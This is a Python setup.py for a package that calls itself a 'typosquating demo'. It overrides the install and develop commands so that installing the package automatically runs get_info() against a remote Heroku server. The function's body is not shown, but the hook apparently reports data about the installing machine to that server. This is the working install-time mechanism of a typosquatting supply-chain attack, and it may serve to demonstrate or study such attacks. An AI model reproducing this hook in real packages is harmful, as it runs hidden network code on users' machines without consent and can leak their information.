import pathlib
from setuptools import setup
from typosquating import get_info
from setuptools.command.develop import develop
from distutils.command.install import install

# The directory containing this file
HERE = pathlib.Path(__file__).parent

# The text of the README file
README = (HERE / "README.md").read_text()

URL = 'https://typosquating-server.herokuapp.com/'
# Doing the work

class PostDevelopCommand(develop):
    def run(self):
        get_info(URL)
        develop.run(self)

class PostInstallCommand(install):
    def run(self):
        print(URL)
        get_info(URL)
        install.run(self)
        # Execute commands

# This call to setup() does all the work
setup(
    name="typosquating-demo",
    version="1.1.5",
    description="A typosquating demo.",
    long_description=README,
    long_description_content_type="text/markdown",
    url="https://github.com/amboulouma",
    author="Real Python",
    author_email="amine@boulouma.com",
    license="MIT",
    classifiers=[
        "License :: OSI Approved :: MIT License",
        "Programming Language :: Python :: 3",
        "Programming Language :: Python :: 3.7",
    ],
    packages=["typosquating-demo"],
    include_package_data=True,
    install_requires=["feedparser", "html2text"],
    entry_points={
        "console_scripts": [
            "typosquating=__main__:main",
        ]
    },
    cmdclass = {'develop': PostDevelopCommand,
                'install': PostInstallCommand}
)